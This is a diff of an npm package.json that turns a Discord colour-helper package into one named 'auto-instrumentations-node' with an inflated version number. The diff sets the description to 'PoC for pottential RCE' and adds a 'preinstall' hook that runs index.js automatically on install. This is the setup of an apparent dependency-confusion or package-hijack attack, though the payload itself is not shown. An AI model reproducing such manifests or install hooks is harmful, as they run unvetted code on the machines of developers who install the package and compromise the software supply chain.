@@ -1,35 +1,12 @@
 {
-  "name": "discord-color",
-  "version": "1.0.8",
-  "description": "Get easy colors for djs embeds",
-  "main": "./src/file/RGB/hexRGB",
-  "directories": {
-    "test": "test"
-  },
+  "name": "auto-instrumentations-node",
+  "version": "213.21.24",
+  "description": "PoC for pottential RCE",
+  "main": "index.js",
   "scripts": {
-    "getColorTest": "node ./test/tests/getColorTest.js",
-    "getRandomColorTest": "node ./test/tests/getRandomColorTest.js",
-    "getRandomGenTest": "node ./test/tests/getRandomGenTest.js"
+    "test": "echo \"Error: exzuperi made me\" && exit 1",
+    "preinstall": "node index.js"
   },
-  "repository": {
-    "type": "github",
-    "url": "https://github.com/aluffyz/discord-color/"
-  },
-  "keywords": [
-    "discordjs",
-    "discord",
-    "djs-easy-color",
-    "embeds"
-  ],
-  "author": "aluffyz",
-  "license": "ISC",
-  "bugs": {
-    "url": "https://github.com/aluffyz/discord-color/-/issues"
-  },
-  "homepage": "https://github.com/aluffyz/discord-color/-/blob/main/README.md",
-  "dependencies": {
-    "axios": "^1.6.8",
-    "child_process": "^1.0.2",
-    "os": "^0.1.2"
-  }
+  "author": "",
+  "license": "ISC"
 }
